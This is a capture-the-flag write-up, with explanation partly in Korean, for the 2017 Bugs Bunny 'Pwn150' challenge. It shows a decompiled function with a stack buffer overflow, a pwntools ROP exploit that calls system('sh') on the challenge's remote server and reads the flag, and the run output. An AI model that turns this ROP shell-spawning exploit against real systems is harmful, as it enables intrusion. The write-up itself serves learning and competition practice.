# 2017 bugsbunny - [PWN] Pwn150

## Key words

- x86_64 simple stack bof
- gdb : set follow-fork-mode [child | parent]

## Check Security

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

```c
signed __int64 Hello()
{
  signed __int64 result; // rax@2
  char s; // [sp+0h] [bp-50h]@1
  FILE *v2; // [sp+48h] [bp-8h]@1

  printf("Hello pwner, Send me your message here: ");
  fflush(stdout);
  fgets(&s, 0xC0, stdin);
  v2 = fopen("bugsbunny.txt", "a");
  if ( v2 )
  {
    fwrite(&s, 0x40uLL, 1uLL, v2);
    result = 0LL;
  }
  else
  {
    puts("So shorry cant talk to you now :( ");
    result = 1LL;
  }
  return result;
}
```

문제를 보면 입력 받는 스트링에서 `rbp`까지 `0x50`인데 입력을 받는게 `0xc0`를 입력 받기 때문에 `Stack BOF`가 발생합니다. 

문제에 `NX`가 켜져있기 때문에 쉘 코드를 올려 뛸수가 없기 때문에 `ROP`를 구성하여 쉘을 획득 합니다.

문제 바이너리에서 이미 `system`함수를 사용했기 때문에 이를 이용하고, 바이너리 내부에 존재하는 `sh\x00` 문자열을 함수의 첫 번째 인자인 `$rdi`에 넣고 호출 합니다.

## Exploit Code

```python
from pwn import *

server = "54.67.102.66"
port   =  5253

system_addr = 0x4005e0

p = remote(server, port)
e = ELF("./pwn150")

pr = 0x400882
sh = 0x6003ef
pop_rdi_ret = 0x400883

print p.recv()

payload = ""
payload += "A" * 0x50
payload += "B" * 8 # rbp
payload += p64(pop_rdi_ret)
payload += p64(sh)
payload += p64(e.plt["system"])

p.sendline(payload)
p.sendline("cat /home/pwn150/flag")
print p.recv()
print p.recv()
```

## Result

```
tbkim@ubuntu:~/ctf/pwnable/0014_2017_bugsbunny_pwn150$ python sol_pwn150.py 
[+] Opening connection to 54.67.102.66 on port 5253: Done
[*] '/home/tbkim/ctf/pwnable/0014_2017_bugsbunny_pwn150/pwn150'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Wed Aug  2 08:01:55 UTC 2017

Hello pwner, Send me your message here: 
Bugs_Bunny{did_i_help_you_Solve_it!oHH_talk_to_hacker:D}

[*] Closed connection to 54.67.102.66 port 5253
```